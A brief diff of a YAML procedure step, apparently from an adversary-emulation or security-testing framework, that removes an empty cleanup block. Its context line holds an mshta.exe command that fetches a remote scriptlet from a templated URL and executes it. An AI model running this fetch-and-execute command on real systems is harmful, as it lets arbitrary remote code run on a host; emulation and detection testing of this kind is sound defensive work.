@@ -24,6 +24,3 @@ steps:
       inline: |
         C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:{{.Args.url}}').Exec();close()"
       executor: command_prompt
-      cleanup:
-        inline: ""
-        executor: command_prompt
